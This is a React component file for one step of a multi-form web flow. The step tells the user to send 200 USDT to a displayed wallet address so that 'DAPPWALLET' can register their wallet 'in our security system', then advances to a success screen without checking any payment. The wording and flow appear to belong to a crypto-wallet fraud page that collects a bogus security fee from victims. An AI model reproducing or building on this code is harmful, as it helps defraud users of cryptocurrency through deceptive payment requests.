/* eslint-disable react/prop-types */
import React, { createContext, useContext, useState } from "react";
import SuccessForm from "./SuccessForm";
import CopyToClipboard from "react-copy-to-clipboard";
import styles from "./FormTwo.module.css";
import { copy } from "../assets";

const FormContext = createContext();

export const useForm = () => useContext(FormContext);

const FormFive = ({ selectedNetwork }) => {
  const walletAddress = `${selectedNetwork.address}`;
  const [next, setNext] = useState(false);
  const [copied, setCopied] = useState(null);

  const copyHandler = () => {
    setCopied(true);
    setTimeout(() => {
      setCopied(null);
    }, 5000); // Reset the copied state after 5 seconds (5000 milliseconds)
  };

  return (
    <>
      <FormContext.Provider value={{ selectedNetwork }}>
        {next ? (
          <SuccessForm selectedNetwork={selectedNetwork} />
        ) : (
          <div>
            <p className="mb-[1rem] text-center text-[#121212] text-[0.8rem]">
              Kindly send 200 USDT to the wallet address below. ...After
              confirming the deposit, DAPPWALLET will manage the process
              automatically within 1 day, registering your wallet in our
              security system.
            </p>
            <div className="text-center">
              <p className="text-[#00000080] text-[0.7rem]">
                Blockchain Network:
                <span> {selectedNetwork.blockchainNetwork}</span>{" "}
              </p>
              <p className="text-[#00000080] text-[0.7rem]">
                WALLET ADDRESS BELOW
              </p>
              <CopyToClipboard text={walletAddress}>
                <button onClick={copyHandler}>
                  {copied ? (
                    <p>
                      Copied{" "}
                      <span>
                        <img src={copy} />
                      </span>
                    </p>
                  ) : (
                    <p>Copy</p>
                  )}
                </button>
              </CopyToClipboard>
              <p className="text-[0.7rem] font-bold mt-[0.7rem]">
                {selectedNetwork.address}
              </p>
            </div>

            <button
              onClick={() => setNext((prev) => !prev)}
              className={`${styles.btn} py-[0.7rem] mt-[1rem]`}
            >
              Next
            </button>
          </div>
        )}
      </FormContext.Provider>
    </>
  );
};

export default FormFive;
